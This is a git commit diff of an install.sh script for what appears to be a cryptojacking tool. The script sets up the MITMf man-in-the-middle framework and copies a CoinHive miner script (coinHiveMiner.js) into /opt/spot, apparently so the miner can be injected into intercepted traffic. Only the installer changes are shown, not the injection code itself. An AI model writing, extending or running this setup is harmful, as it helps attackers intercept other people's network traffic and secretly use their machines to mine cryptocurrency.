8278c659027e198bf1b95349796f172a9f131e28
Giceh Lits <35171422+hilthen@users.noreply.github.com>
2018-01-17 22:04:10 +0500

    Release 0.2

--- install.sh
+++ install.sh
@@ -1,7 +1,11 @@
 #!/bin/bash
-#Add kali repos
 sudo apt update
-sudo apt install mitmf mitmflib
+apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libxml2-dev libxslt1-dev python-dnslib python-magic python-netfilterqueue python-ua-parser python-user-agents
+pip install requests[security]
+cd /opt
+sudo git clone https://github.com/byt3bl33d3r/MITMf
+cd MITMf && git submodule init && git submodule update --recursive
+pip install -r requirements.txt
 sudo mkdir /opt/spot
 here=`pwd`
 sudo cp $here/coinHiveMiner.js /opt/spot/
